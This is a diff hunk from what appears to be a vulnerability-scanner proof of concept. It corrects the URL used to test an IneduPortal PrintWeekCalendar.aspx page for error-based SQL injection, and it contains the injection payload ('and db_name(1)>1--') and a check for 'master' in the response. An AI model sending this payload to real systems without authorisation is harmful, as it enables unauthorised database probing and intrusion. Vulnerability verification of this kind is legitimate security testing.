@@ -53,7 +53,7 @@ class Poc(ABPoc):
             hh = hackhttp.hackhttp()
             payload2 = '/IneduPortal/Components/WeekCalendar/PrintWeekCalendar.aspx?termid=2014-2015-1'
             get = '%27%20and%20db_name(1)%3E1--'
-            verify_url = self.target + payload + get
+            verify_url = self.target + payload2 + get
             code, head, res, errcode, _ = hh.http(verify_url)
             m = re.search('master', res)
 
